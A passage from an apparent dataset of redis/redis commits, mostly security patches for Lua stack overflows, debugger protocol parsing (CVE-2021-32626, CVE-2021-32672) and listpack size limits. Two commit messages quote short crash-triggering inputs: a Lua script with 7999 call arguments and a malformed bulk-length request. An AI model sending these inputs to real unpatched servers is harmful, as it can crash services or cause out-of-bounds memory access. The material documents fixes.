    297ecbecb Tiny formatting changes + suppress implicit memcpy warning

    f746a28e7 Removed 2 typecasts

    940a04f4d Added fuzzer

    e4a200040 Merge pull request #896 from ayeganov/bugfix/ssl_leak

    aefef8987 Free SSL object when redisSSLConnect fails

    e3f88ebcf Merge pull request #894 from jcohen02/fix/issue893

    308ffcab8 Updating SSL connection example

    297f6551d Merge pull request #889 from redis/wincert

    e7dda9785 Formatting

    f44945a0a Merge pull request #874 from masariello/position-independent-code

    74e78498c Merge pull request #888 from michael-grunder/nil-push-invalidation

    b9b9f446f Fix handling of NIL invalidation messages.

    acc917548 Merge pull request #885 from gkorland/patch-1

    b086f763e clean a warning, remvoe empty else block

    b47fae4e7 Merge pull request #881 from timgates42/bugfix_typo_terminated

    f989670e5 docs: Fix simple typo, termined -> terminated

    773d6ea8a Copy error to redisAsyncContext on timeout

    e35300a66 add pdb files to packages for MSVC builds

    dde6916b4 Add d suffix to debug libraries so that can packaged together with optimized
    builds (Release, RelWithDebInfo, etc)

    3b68b5018 Enable position-independent code

    6693863f4 Add support for system CA certificate store on Windows

    2a5a57b90 Remove whitespace

    1b40ec509 fixed issue with unit test linking on windows with SSL

    d7b1d21e8 Merge branch ''master'' of github.com:redis/hiredis

    fb0e6c0dd Merge pull request #870 from michael-grunder/cmake-c99

    13a35bdb6 Explicitly set c99 in CMake

    bea137ca9 Merge pull request #868 from michael-grunder/fix-sockaddr-typo

    bd6f86eb6 Fix sockaddr typo

    48696e7e5 Don''t use non-installed win32.h helper in examples (#863)

    faa1c4863 Merge tag ''v1.0.0''

    5003906d6 Define a no op assert if we detect NDEBUG (#861)

    ea063b7cc Use development specific versions in master

    04a27f480 We can run SSL tests everywhere except mingw/Windows (#859)

    8966a1fc2 Remove extra whitespace (#858)

    34b7f7a0f Keep libev''s code style (#857)

    07c3618ff Add static library target and cpack support

    REVERT: 00272d669 Rename sds calls so they don''t conflict in Redis.


    git-subtree-dir: deps/hiredis

    git-subtree-split: f8de9a4bd433791890572f7b9147e685653ddef9'
  commit_sha: 418de21d8feb35303904ec718fcd1387e4699d2f
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/scripting.c\n+++ b/src/scripting.c\n@@ -790,6 +790,10 @@ int luaRedisGenericCommand(lua_State\
    \ *lua, int raise_error) {\n         return raise_error ? luaRaiseError(lua) :\
    \ 1;\n     }\n \n+    /* Pop all arguments from the stack, we do not need them\
    \ anymore\n+     * and this way we guaranty we will have room on the stack for\
    \ the result. */\n+    lua_pop(lua, argc);\n+\n     /* Setup our fake client for\
    \ command execution */\n     c->argv = argv;\n     c->argc = argc;"
  commit_message: "Clean Lua stack before parsing call reply to avoid crash on a call\
    \ with many arguments (#9809)\n\nThis commit 0f8b634cd (CVE-2021-32626 released\
    \ in 6.2.6, 6.0.16, 5.0.14)\r\nfixes an invalid memory write issue by using `lua_checkstack`\
    \ API to make\r\nsure the Lua stack is not overflow. This fix was added on 3 places:\r\
    \n1. `luaReplyToRedisReply`\r\n2. `ldbRedis`\r\n3. `redisProtocolToLuaType`\r\n\
    \r\nOn the first 2 functions, `lua_checkstack` is handled gracefully while the\r\
    \nlast is handled with an assert and a statement that this situation can\r\nnot\
    \ happened (only with misbehave module):\r\n\r\n> the Redis reply might be deep\
    \ enough to explode the LUA stack (notice\r\nthat currently there is no such command\
    \ in Redis that returns such a nested\r\nreply, but modules might do it)\r\n\r\
    \nThe issue that was discovered is that user arguments is also considered part\r\
    \nof the stack, and so the following script (for example) make the assertion reachable:\r\
    \n```\r\nlocal a = {}\r\nfor i=1,7999 do\r\n    a[i] = 1\r\nend \r\nreturn redis.call(\"\
    lpush\", \"l\", unpack(a))\r\n```\r\n\r\nThis is a regression because such a script\
    \ would have worked before and now\r\nits crashing Redis. The solution is to clear\
    \ the function arguments from the Lua\r\nstack which makes the original assumption\
    \ true and the assertion unreachable."
  commit_sha: 6b0b04f1b265c429bd19d6c99c9e7e2921723601
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/scripting.c\n+++ b/src/scripting.c\n@@ -169,6 +169,11 @@ static void\
    \ redisProtocolToLuaType_Int(void *ctx, long long val, const char *pro\n     }\n\
    \ \n     lua_State *lua = ctx;\n+    if (!lua_checkstack(lua, 1)) {\n+       \
    \ /* Increase the Lua stack if needed, to make sure there is enough room\n+  \
    \       * to push elements to the stack. On failure, exit with panic. */\n+  \
    \      serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n\
    +    }\n     lua_pushnumber(lua,(lua_Number)val);\n }\n \n@@ -180,6 +185,11 @@\
    \ static void redisProtocolToLuaType_NullBulkString(void *ctx, const char *proto,\n\
    \     }\n \n     lua_State *lua = ctx;\n+    if (!lua_checkstack(lua, 1)) {\n\
    +        /* Increase the Lua stack if needed, to make sure there is enough room\n\
    +         * to push elements to the stack. On failure, exit with panic. */\n+\
    \        serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n\
    +    }\n     lua_pushboolean(lua,0);\n }\n \n@@ -190,6 +200,11 @@ static void\
    \ redisProtocolToLuaType_NullArray(void *ctx, const char *proto, size_\n     \
    \    return;\n     }\n     lua_State *lua = ctx;\n+    if (!lua_checkstack(lua,\
    \ 1)) {\n+        /* Increase the Lua stack if needed, to make sure there is enough\
    \ room\n+         * to push elements to the stack. On failure, exit with panic.\
    \ */\n+        serverPanic(\"lua stack limit reach when parsing redis.call reply\"\
    );\n+    }\n     lua_pushboolean(lua,0);\n }\n \n@@ -202,6 +217,11 @@ static void\
    \ redisProtocolToLuaType_BulkString(void *ctx, const char *str, size_t\n     }\n\
    \ \n     lua_State *lua = ctx;\n+    if (!lua_checkstack(lua, 1)) {\n+       \
    \ /* Increase the Lua stack if needed, to make sure there is enough room\n+  \
    \       * to push elements to the stack. On failure, exit with panic. */\n+  \
    \      serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n\
    +    }\n     lua_pushlstring(lua,str,len);\n }\n \n@@ -213,7 +233,11 @@ static\
    \ void redisProtocolToLuaType_Status(void *ctx, const char *str, size_t len\n\
    \     }\n \n     lua_State *lua = ctx;\n-\n+    if (!lua_checkstack(lua, 3)) {\n\
    +        /* Increase the Lua stack if needed, to make sure there is enough room\n\
    +         * to push elements to the stack. On failure, exit with panic. */\n+\
    \        serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n\
    +    }\n     lua_newtable(lua);\n     lua_pushstring(lua,\"ok\");\n     lua_pushlstring(lua,str,len);\n\
    @@ -228,7 +252,11 @@ static void redisProtocolToLuaType_Error(void *ctx, const\
    \ char *str, size_t len,\n     }\n \n     lua_State *lua = ctx;\n-\n+    if (!lua_checkstack(lua,\
    \ 3)) {\n+        /* Increase the Lua stack if needed, to make sure there is enough\
    \ room\n+         * to push elements to the stack. On failure, exit with panic.\
    \ */\n+        serverPanic(\"lua stack limit reach when parsing redis.call reply\"\
    );\n+    }\n     lua_newtable(lua);\n     lua_pushstring(lua,\"err\");\n     lua_pushlstring(lua,str,len);\n\
    @@ -239,6 +267,11 @@ static void redisProtocolToLuaType_Map(struct ReplyParser\
    \ *parser, void *ctx, si\n     UNUSED(proto);\n     lua_State *lua = ctx;\n  \
    \   if (lua) {\n+        if (!lua_checkstack(lua, 3)) {\n+            /* Increase\
    \ the Lua stack if needed, to make sure there is enough room\n+             *\
    \ to push elements to the stack. On failure, exit with panic. */\n+          \
    \  serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n+  \
    \      }\n         lua_newtable(lua);\n         lua_pushstring(lua, \"map\");\n\
    \         lua_newtable(lua);\n@@ -256,13 +289,25 @@ static void redisProtocolToLuaType_Set(struct\
    \ ReplyParser *parser, void *ctx, si\n \n     lua_State *lua = ctx;\n     if (lua)\
    \ {\n+        if (!lua_checkstack(lua, 3)) {\n+            /* Increase the Lua\
    \ stack if needed, to make sure there is enough room\n+             * to push\
    \ elements to the stack. On failure, exit with panic. */\n+            serverPanic(\"\
    lua stack limit reach when parsing redis.call reply\");\n+        }\n        \
    \ lua_newtable(lua);\n         lua_pushstring(lua, \"set\");\n         lua_newtable(lua);\n\
    \     }\n     for (size_t j = 0; j < len; j++) {\n         parseReply(parser,lua);\n\
    \         if (lua) {\n+            if (!lua_checkstack(lua, 1)) {\n+         \
    \       /* Increase the Lua stack if needed, to make sure there is enough room\n\
    +                 * to push elements to the stack. On failure, exit with panic.\n\
    +                 * Notice that here we need to check the stack again because\
    \ the recursive\n+                 * call to redisProtocolToLuaType might have\
    \ use the room allocated in the stack*/\n+                serverPanic(\"lua stack\
    \ limit reach when parsing redis.call reply\");\n+            }\n            \
    \ lua_pushboolean(lua,1);\n             lua_settable(lua,-3);\n         }\n@@\
    \ -274,7 +319,14 @@ static void redisProtocolToLuaType_Array(struct ReplyParser\
    \ *parser, void *ctx,\n     UNUSED(proto);\n \n     lua_State *lua = ctx;\n- \
    \   if (lua) lua_newtable(lua);\n+    if (lua){\n+        if (!lua_checkstack(lua,\
    \ 2)) {\n+            /* Increase the Lua stack if needed, to make sure there\
    \ is enough room\n+             * to push elements to the stack. On failure, exit\
    \ with panic. */\n+            serverPanic(\"lua stack limit reach when parsing\
    \ redis.call reply\");\n+        }\n+        lua_newtable(lua);\n+    }\n    \
    \ for (size_t j = 0; j < len; j++) {\n         if (lua) lua_pushnumber(lua,j+1);\n\
    \         parseReply(parser,lua);\n@@ -306,7 +358,11 @@ static void redisProtocolToLuaType_VerbatimString(void\
    \ *ctx, const char *format,\n     }\n \n     lua_State *lua = ctx;\n-\n+    if\
    \ (!lua_checkstack(lua, 5)) {\n+        /* Increase the Lua stack if needed, to\
    \ make sure there is enough room\n+         * to push elements to the stack. On\
    \ failure, exit with panic. */\n+        serverPanic(\"lua stack limit reach when\
    \ parsing redis.call reply\");\n+    }\n     lua_newtable(lua);\n     lua_pushstring(lua,\"\
    verbatim_string\");\n     lua_newtable(lua);\n@@ -327,7 +383,11 @@ static void\
    \ redisProtocolToLuaType_BigNumber(void *ctx, const char *str, size_t\n     }\n\
    \ \n     lua_State *lua = ctx;\n-\n+    if (!lua_checkstack(lua, 3)) {\n+    \
    \    /* Increase the Lua stack if needed, to make sure there is enough room\n\
    +         * to push elements to the stack. On failure, exit with panic. */\n+\
    \        serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n\
    +    }\n     lua_newtable(lua);\n     lua_pushstring(lua,\"big_number\");\n  \
    \   lua_pushlstring(lua,str,len);\n@@ -342,6 +402,11 @@ static void redisProtocolToLuaType_Null(void\
    \ *ctx, const char *proto, size_t pro\n     }\n \n     lua_State *lua = ctx;\n\
    +    if (!lua_checkstack(lua, 1)) {\n+        /* Increase the Lua stack if needed,\
    \ to make sure there is enough room\n+         * to push elements to the stack.\
    \ On failure, exit with panic. */\n+        serverPanic(\"lua stack limit reach\
    \ when parsing redis.call reply\");\n+    }\n     lua_pushnil(lua);\n }\n \n@@\
    \ -353,6 +418,11 @@ static void redisProtocolToLuaType_Bool(void *ctx, int val,\
    \ const char *proto, s\n     }\n \n     lua_State *lua = ctx;\n+    if (!lua_checkstack(lua,\
    \ 1)) {\n+        /* Increase the Lua stack if needed, to make sure there is enough\
    \ room\n+         * to push elements to the stack. On failure, exit with panic.\
    \ */\n+        serverPanic(\"lua stack limit reach when parsing redis.call reply\"\
    );\n+    }\n     lua_pushboolean(lua,val);\n }\n \n@@ -364,6 +434,11 @@ static\
    \ void redisProtocolToLuaType_Double(void *ctx, double d, const char *proto\n\
    \     }\n \n     lua_State *lua = ctx;\n+    if (!lua_checkstack(lua, 3)) {\n\
    +        /* Increase the Lua stack if needed, to make sure there is enough room\n\
    +         * to push elements to the stack. On failure, exit with panic. */\n+\
    \        serverPanic(\"lua stack limit reach when parsing redis.call reply\");\n\
    +    }\n     lua_newtable(lua);\n     lua_pushstring(lua,\"double\");\n     lua_pushnumber(lua,d);\n\
    @@ -449,6 +524,16 @@ void luaSortArray(lua_State *lua) {\n void luaReplyToRedisReply(client\
    \ *c, lua_State *lua) {\n     int t = lua_type(lua,-1);\n \n+    if (!lua_checkstack(lua,\
    \ 4)) {\n+        /* Increase the Lua stack if needed to make sure there is enough\
    \ room\n+         * to push 4 elements to the stack. On failure, return error.\n\
    +         * Notice that we need, in the worst case, 4 elements because returning\
    \ a map might\n+         * require push 4 elements to the Lua stack.*/\n+    \
    \    addReplyErrorFormat(c, \"reached lua stack limit\");\n+        lua_pop(lua,1);\
    \ /* pop the element from the stack */\n+        return;\n+    }\n+\n     switch(t)\
    \ {\n     case LUA_TSTRING:\n         addReplyBulkCBuffer(c,(char*)lua_tostring(lua,-1),lua_strlen(lua,-1));\n\
    @@ -470,6 +555,7 @@ void luaReplyToRedisReply(client *c, lua_State *lua) {\n \
    \         * field. */\n \n         /* Handle error reply. */\n+        /* we took\
    \ care of the stack size on function start */\n         lua_pushstring(lua,\"\
    err\");\n         lua_gettable(lua,-2);\n         t = lua_type(lua,-1);\n@@ -549,6\
    \ +635,7 @@ void luaReplyToRedisReply(client *c, lua_State *lua) {\n         if\
    \ (t == LUA_TTABLE) {\n             int maplen = 0;\n             void *replylen\
    \ = addReplyDeferredLen(c);\n+            /* we took care of the stack size on\
    \ function start */\n             lua_pushnil(lua); /* Use nil to start iteration.\
    \ */\n             while (lua_next(lua,-2)) {\n                 /* Stack now:\
    \ table, key, value */\n@@ -571,6 +658,7 @@ void luaReplyToRedisReply(client *c,\
    \ lua_State *lua) {\n         if (t == LUA_TTABLE) {\n             int setlen\
    \ = 0;\n             void *replylen = addReplyDeferredLen(c);\n+            /*\
    \ we took care of the stack size on function start */\n             lua_pushnil(lua);\
    \ /* Use nil to start iteration. */\n             while (lua_next(lua,-2)) {\n\
    \                 /* Stack now: table, key, true */\n@@ -590,6 +678,7 @@ void\
    \ luaReplyToRedisReply(client *c, lua_State *lua) {\n         void *replylen =\
    \ addReplyDeferredLen(c);\n         int j = 1, mbulklen = 0;\n         while(1)\
    \ {\n+            /* we took care of the stack size on function start */\n   \
    \          lua_pushnumber(lua,j++);\n             lua_gettable(lua,-2);\n    \
    \         t = lua_type(lua,-1);\n@@ -2270,7 +2359,7 @@ sds *ldbReplParseCommand(int\
    \ *argcp, char** err) {\n     argv = zmalloc(sizeof(sds)*(*argcp));\n     argc\
    \ = 0;\n     while(argc < *argcp) {\n-        // reached the end but there should\
    \ be more data to read\n+        /* reached the end but there should be more data\
    \ to read */\n         if (*p == '\\0') goto keep_reading;\n \n         if (*p\
    \ != '$') goto protoerr;\n@@ -2723,6 +2812,17 @@ void ldbEval(lua_State *lua,\
    \ sds *argv, int argc) {\n void ldbRedis(lua_State *lua, sds *argv, int argc)\
    \ {\n     int j, saved_rc = server.lua_replicate_commands;\n \n+    if (!lua_checkstack(lua,\
    \ argc + 1)) {\n+        /* Increase the Lua stack if needed to make sure there\
    \ is enough room\n+         * to push 'argc + 1' elements to the stack. On failure,\
    \ return error.\n+         * Notice that we need, in worst case, 'argc + 1' elements\
    \ because we push all the arguments\n+         * given by the user (without the\
    \ first argument) and we also push the 'redis' global table and\n+         * 'redis.call'\
    \ function so:\n+         * (1 (redis table)) + (1 (redis.call function)) + (argc\
    \ - 1 (all arguments without the first)) = argc + 1*/\n+        ldbLogRedisReply(\"\
    max lua stack reached\");\n+        return;\n+    }\n+\n     lua_getglobal(lua,\"\
    redis\");\n     lua_pushstring(lua,\"call\");\n     lua_gettable(lua,-2);    \
    \   /* Stack: redis, redis.call */"
  commit_message: "Fix invalid memory write on lua stack overflow (CVE-2021-32626)\
    \ (#9591)\n\nWhen LUA call our C code, by default, the LUA stack has room for\
    \ 10\r\nelements. In most cases, this is more than enough but sometimes it's not\r\
    \nand the caller must verify the LUA stack size before he pushes elements.\r\n\
    \r\nOn 3 places in the code, there was no verification of the LUA stack size.\r\
    \nOn specific inputs this missing verification could have lead to invalid\r\n\
    memory write:\r\n1. On 'luaReplyToRedisReply', one might return a nested reply\
    \ that will\r\n   explode the LUA stack.\r\n2. On 'redisProtocolToLuaType', the\
    \ Redis reply might be deep enough\r\n   to explode the LUA stack (notice that\
    \ currently there is no such\r\n   command in Redis that returns such a nested\
    \ reply, but modules might\r\n   do it)\r\n3. On 'ldbRedis', one might give a\
    \ command with enough arguments to\r\n   explode the LUA stack (all the arguments\
    \ will be pushed to the LUA\r\n   stack)\r\n\r\nThis commit is solving all those\
    \ 3 issues by calling 'lua_checkstack' and\r\nverify that there is enough room\
    \ in the LUA stack to push elements. In\r\ncase 'lua_checkstack' returns an error\
    \ (there is not enough room in the\r\nLUA stack and it's not possible to increase\
    \ the stack), we will do the\r\nfollowing:\r\n1. On 'luaReplyToRedisReply', we\
    \ will return an error to the user.\r\n2. On 'redisProtocolToLuaType' we will\
    \ exit with panic (we assume this\r\n   scenario is rare because it can only happen\
    \ with a module).\r\n3. On 'ldbRedis', we return an error."
  commit_sha: 0f8b634cd5cdfd77696d34d744dfc25fa97f3b73
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/scripting.c\n+++ b/src/scripting.c\n@@ -2243,7 +2243,8 @@ int ldbDelBreakpoint(int\
    \ line) {\n /* Expect a valid multi-bulk command in the debugging client query\
    \ buffer.\n  * On success the command is parsed and returned as an array of SDS\
    \ strings,\n  * otherwise NULL is returned and there is to read more buffer. */\n\
    -sds *ldbReplParseCommand(int *argcp) {\n+sds *ldbReplParseCommand(int *argcp,\
    \ char** err) {\n+    static char* protocol_error = \"protocol error\";\n    \
    \ sds *argv = NULL;\n     int argc = 0;\n     if (sdslen(ldb.cbuf) == 0) return\
    \ NULL;\n@@ -2260,7 +2261,7 @@ sds *ldbReplParseCommand(int *argcp) {\n     /*\
    \ Seek and parse *<count>\\r\\n. */\n     p = strchr(p,'*'); if (!p) goto protoerr;\n\
    \     char *plen = p+1; /* Multi bulk len pointer. */\n-    p = strstr(p,\"\\\
    r\\n\"); if (!p) goto protoerr;\n+    p = strstr(p,\"\\r\\n\"); if (!p) goto keep_reading;\n\
    \     *p = '\\0'; p += 2;\n     *argcp = atoi(plen);\n     if (*argcp <= 0 ||\
    \ *argcp > 1024) goto protoerr;\n@@ -2269,12 +2270,16 @@ sds *ldbReplParseCommand(int\
    \ *argcp) {\n     argv = zmalloc(sizeof(sds)*(*argcp));\n     argc = 0;\n    \
    \ while(argc < *argcp) {\n+        // reached the end but there should be more\
    \ data to read\n+        if (*p == '\\0') goto keep_reading;\n+\n         if (*p\
    \ != '$') goto protoerr;\n         plen = p+1; /* Bulk string len pointer. */\n\
    -        p = strstr(p,\"\\r\\n\"); if (!p) goto protoerr;\n+        p = strstr(p,\"\
    \\r\\n\"); if (!p) goto keep_reading;\n         *p = '\\0'; p += 2;\n        \
    \ int slen = atoi(plen); /* Length of this arg. */\n         if (slen <= 0 ||\
    \ slen > 1024) goto protoerr;\n+        if ((size_t)(p + slen + 2 - copy) > sdslen(copy)\
    \ ) goto keep_reading;\n         argv[argc++] = sdsnewlen(p,slen);\n         p\
    \ += slen; /* Skip the already parsed argument. */\n         if (p[0] != '\\r'\
    \ || p[1] != '\\n') goto protoerr;\n@@ -2284,6 +2289,8 @@ sds *ldbReplParseCommand(int\
    \ *argcp) {\n     return argv;\n \n protoerr:\n+    *err = protocol_error;\n+keep_reading:\n\
    \     sdsfreesplitres(argv,argc);\n     sdsfree(copy);\n     return NULL;\n@@\
    \ -2772,12 +2779,17 @@ void ldbMaxlen(sds *argv, int argc) {\n int ldbRepl(lua_State\
    \ *lua) {\n     sds *argv;\n     int argc;\n+    char* err = NULL;\n \n     /*\
    \ We continue processing commands until a command that should return\n      *\
    \ to the Lua interpreter is found. */\n     while(1) {\n-        while((argv =\
    \ ldbReplParseCommand(&argc)) == NULL) {\n+        while((argv = ldbReplParseCommand(&argc,\
    \ &err)) == NULL) {\n             char buf[1024];\n+            if (err) {\n+\
    \                lua_pushstring(lua, err);\n+                lua_error(lua);\n\
    +            }\n             int nread = connRead(ldb.conn,buf,sizeof(buf));\n\
    \             if (nread <= 0) {\n                 /* Make sure the script runs\
    \ without user input since the\n@@ -2787,6 +2799,15 @@ int ldbRepl(lua_State *lua)\
    \ {\n                 return C_ERR;\n             }\n             ldb.cbuf = sdscatlen(ldb.cbuf,buf,nread);\n\
    +            /* after 1M we will exit with an error\n+             * so that the\
    \ client will not blow the memory\n+             */\n+            if (sdslen(ldb.cbuf)\
    \ > 1<<20) {\n+                sdsfree(ldb.cbuf);\n+                ldb.cbuf =\
    \ sdsempty();\n+                lua_pushstring(lua, \"max client buffer reached\"\
    );\n+                lua_error(lua);\n+            }\n         }\n \n        \
    \ /* Flush the old buffer. */"
  commit_message: "Fix protocol parsing on 'ldbReplParseCommand' (CVE-2021-32672)\
    \ (#9590)\n\nThe protocol parsing on 'ldbReplParseCommand' (LUA debugging)\r\n\
    Assumed protocol correctness. This means that if the following\r\nis given:\r\n\
    *1\r\n$100\r\ntest\r\nThe parser will try to read additional 94 unallocated bytes\
    \ after\r\nthe client buffer.\r\nThis commit fixes this issue by validating that\
    \ there are actually enough\r\nbytes to read. It also limits the amount of data\
    \ that can be sent by\r\nthe debugger client to 1M so the client will not be able\
    \ to explode\r\nthe memory.\r\n\r\nCo-authored-by: meir@redislabs.com <meir@redislabs.com>"
  commit_sha: b0ca3be2bba3092ec7cc18e1d87380b1af951d48
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/geo.c\n+++ b/src/geo.c\n@@ -797,7 +797,7 @@ void georadiusGeneric(client\
    \ *c, int srcKeyIndex, int flags) {\n         robj *zobj;\n         zset *zs;\n\
    \         int i;\n-        size_t maxelelen = 0;\n+        size_t maxelelen =\
    \ 0, totelelen = 0;\n \n         if (returned_items) {\n             zobj = createZsetObject();\n\
    @@ -812,13 +812,14 @@ void georadiusGeneric(client *c, int srcKeyIndex, int flags)\
    \ {\n             size_t elelen = sdslen(gp->member);\n \n             if (maxelelen\
    \ < elelen) maxelelen = elelen;\n+            totelelen += elelen;\n         \
    \    znode = zslInsert(zs->zsl,score,gp->member);\n             serverAssert(dictAdd(zs->dict,gp->member,&znode->score)\
    \ == DICT_OK);\n             gp->member = NULL;\n         }\n \n         if (returned_items)\
    \ {\n-            zsetConvertToListpackIfNeeded(zobj,maxelelen);\n+          \
    \  zsetConvertToListpackIfNeeded(zobj,maxelelen,totelelen);\n             setKey(c,c->db,storekey,zobj);\n\
    \             decrRefCount(zobj);\n             notifyKeyspaceEvent(NOTIFY_ZSET,flags\
    \ & GEOSEARCH ? \"geosearchstore\" : \"georadiusstore\",storekey,"
  - "--- a/src/listpack.c\n+++ b/src/listpack.c\n@@ -140,6 +140,16 @@\n \n static\
    \ inline void lpAssertValidEntry(unsigned char* lp, size_t lpbytes, unsigned char\
    \ *p);\n \n+/* Don't let listpacks grow over 1GB in any case, don't wanna risk\
    \ overflow in\n+ * Total Bytes header field */\n+#define LISTPACK_MAX_SAFETY_SIZE\
    \ (1<<30)\n+int lpSafeToAdd(unsigned char* lp, size_t add) {\n+    size_t len\
    \ = lp? lpGetTotalBytes(lp): 0;\n+    if (len + add > LISTPACK_MAX_SAFETY_SIZE)\n\
    +        return 0;\n+    return 1;\n+}\n+\n /* Convert a string into a signed\
    \ 64 bit integer.\n  * The function returns 1 if the string could be parsed into\
    \ a (non-overflowing)\n  * signed 64 bit int, 0 otherwise. The 'value' will be\
    \ set to the parsed value\n@@ -324,7 +334,7 @@ static inline int lpEncodeGetType(unsigned\
    \ char *ele, uint32_t size, unsigned ch\n     } else {\n         if (size < 64)\
    \ *enclen = 1+size;\n         else if (size < 4096) *enclen = 2+size;\n-     \
    \   else *enclen = 5+size;\n+        else *enclen = 5+(uint64_t)size;\n      \
    \   return LP_ENCODING_STRING;\n     }\n }"
  - "--- a/src/module.c\n+++ b/src/module.c\n@@ -4064,6 +4064,7 @@ int RM_HashGet(RedisModuleKey\
    \ *key, int flags, ...) {\n  * - EDOM if the given ID was 0-0 or not greater than\
    \ all other IDs in the\n  *   stream (only if the AUTOID flag is unset)\n  * -\
    \ EFBIG if the stream has reached the last possible ID\n+ * - ERANGE if the elements\
    \ are too large to be stored.\n  */\n int RM_StreamAdd(RedisModuleKey *key, int\
    \ flags, RedisModuleStreamID *id, RedisModuleString **argv, long numfields) {\n\
    \     /* Validate args */\n@@ -4107,8 +4108,9 @@ int RM_StreamAdd(RedisModuleKey\
    \ *key, int flags, RedisModuleStreamID *id, RedisM\n         use_id_ptr = &use_id;\n\
    \     }\n     if (streamAppendItem(s, argv, numfields, &added_id, use_id_ptr)\
    \ == C_ERR) {\n-        /* ID not greater than all existing IDs in the stream\
    \ */\n-        errno = EDOM;\n+        /* Either the ID not greater than all existing\
    \ IDs in the stream, or\n+         * the elements are too large to be stored.\
    \ either way, errno is already\n+         * set by streamAppendItem. */\n    \
    \     return REDISMODULE_ERR;\n     }\n     /* Postponed signalKeyAsReady(). Done\
    \ implicitly by moduleCreateEmptyKey()"
  - "--- a/src/quicklist.c\n+++ b/src/quicklist.c\n@@ -45,11 +45,16 @@\n #define REDIS_STATIC\
    \ static\n #endif\n \n-/* Optimization levels for size-based filling */\n+/* Optimization\
    \ levels for size-based filling.\n+ * Note that the largest possible limit is\
    \ 16k, so even if each record takes\n+ * just one byte, it still won't overflow\
    \ the 16 bit count field. */\n static const size_t optimization_level[] = {4096,\
    \ 8192, 16384, 32768, 65536};\n \n /* Maximum size in bytes of any multi-element\
    \ ziplist.\n- * Larger values will live in their own isolated ziplists. */\n+\
    \ * Larger values will live in their own isolated ziplists.\n+ * This is used\
    \ only if we're limited by record count. when we're limited by\n+ * size, the\
    \ maximum limit is bigger, but still safe.\n+ * 8k is a recommended / default\
    \ size limit */\n #define SIZE_SAFETY_LIMIT 8192\n \n /* Minimum ziplist size\
    \ in bytes for attempting compression. */\n@@ -444,6 +449,8 @@ REDIS_STATIC int\
    \ _quicklistNodeAllowInsert(const quicklistNode *node,\n     unsigned int new_sz\
    \ = node->sz + sz + ziplist_overhead;\n     if (likely(_quicklistNodeSizeMeetsOptimizationRequirement(new_sz,\
    \ fill)))\n         return 1;\n+    /* when we return 1 above we know that the\
    \ limit is a size limit (which is\n+     * safe, see comments next to optimization_level\
    \ and SIZE_SAFETY_LIMIT) */\n     else if (!sizeMeetsSafetyLimit(new_sz))\n  \
    \       return 0;\n     else if ((int)node->count < fill)\n@@ -463,6 +470,8 @@\
    \ REDIS_STATIC int _quicklistNodeAllowMerge(const quicklistNode *a,\n     unsigned\
    \ int merge_sz = a->sz + b->sz - 11;\n     if (likely(_quicklistNodeSizeMeetsOptimizationRequirement(merge_sz,\
    \ fill)))\n         return 1;\n+    /* when we return 1 above we know that the\
    \ limit is a size limit (which is\n+     * safe, see comments next to optimization_level\
    \ and SIZE_SAFETY_LIMIT) */\n     else if (!sizeMeetsSafetyLimit(merge_sz))\n\
    \         return 0;\n     else if ((int)(a->count + b->count) <= fill)\n@@ -482,6\
    \ +491,7 @@ REDIS_STATIC int _quicklistNodeAllowMerge(const quicklistNode *a,\n\
    \  * Returns 1 if new head created. */\n int quicklistPushHead(quicklist *quicklist,\
    \ void *value, size_t sz) {\n     quicklistNode *orig_head = quicklist->head;\n\
    +    assert(sz < UINT32_MAX); /* TODO: add support for quicklist nodes that are\
    \ sds encoded (not zipped) */\n     if (likely(\n             _quicklistNodeAllowInsert(quicklist->head,\
    \ quicklist->fill, sz))) {\n         quicklist->head->zl =\n@@ -505,6 +515,7 @@\
    \ int quicklistPushHead(quicklist *quicklist, void *value, size_t sz) {\n  * Returns\
    \ 1 if new tail created. */\n int quicklistPushTail(quicklist *quicklist, void\
    \ *value, size_t sz) {\n     quicklistNode *orig_tail = quicklist->tail;\n+  \
    \  assert(sz < UINT32_MAX); /* TODO: add support for quicklist nodes that are\
    \ sds encoded (not zipped) */\n     if (likely(\n             _quicklistNodeAllowInsert(quicklist->tail,\
    \ quicklist->fill, sz))) {\n         quicklist->tail->zl =\n@@ -853,6 +864,7 @@\
    \ REDIS_STATIC void _quicklistInsert(quicklist *quicklist, quicklistEntry *entry,\n\
    \     int fill = quicklist->fill;\n     quicklistNode *node = entry->node;\n \
    \    quicklistNode *new_node = NULL;\n+    assert(sz < UINT32_MAX); /* TODO: add\
    \ support for quicklist nodes that are sds encoded (not zipped) */\n \n     if\
    \ (!node) {\n         /* we have no reference node, so let's create only node\
    \ in the list */"
  - "--- a/src/rdb.c\n+++ b/src/rdb.c\n@@ -1753,7 +1753,7 @@ robj *rdbLoadObject(int\
    \ rdbtype, rio *rdb, sds key, int dbid, int *error) {\n     } else if (rdbtype\
    \ == RDB_TYPE_ZSET_2 || rdbtype == RDB_TYPE_ZSET) {\n         /* Read sorted set\
    \ value. */\n         uint64_t zsetlen;\n-        size_t maxelelen = 0;\n+   \
    \     size_t maxelelen = 0, totelelen = 0;\n         zset *zs;\n \n         if\
    \ ((zsetlen = rdbLoadLen(rdb,NULL)) == RDB_LENERR) return NULL;\n@@ -1795,6 +1795,7\
    \ @@ robj *rdbLoadObject(int rdbtype, rio *rdb, sds key, int dbid, int *error)\
    \ {\n \n             /* Don't care about integer-encoded strings. */\n       \
    \      if (sdslen(sdsele) > maxelelen) maxelelen = sdslen(sdsele);\n+        \
    \    totelelen += sdslen(sdsele);\n \n             znode = zslInsert(zs->zsl,score,sdsele);\n\
    \             if (dictAdd(zs->dict,sdsele,&znode->score) != DICT_OK) {\n@@ -1807,8\
    \ +1808,11 @@ robj *rdbLoadObject(int rdbtype, rio *rdb, sds key, int dbid, int\
    \ *error) {\n \n         /* Convert *after* loading, since sorted sets are not\
    \ stored ordered. */\n         if (zsetLength(o) <= server.zset_max_listpack_entries\
    \ &&\n-            maxelelen <= server.zset_max_listpack_value)\n-           \
    \     zsetConvert(o,OBJ_ENCODING_LISTPACK);\n+            maxelelen <= server.zset_max_listpack_value\
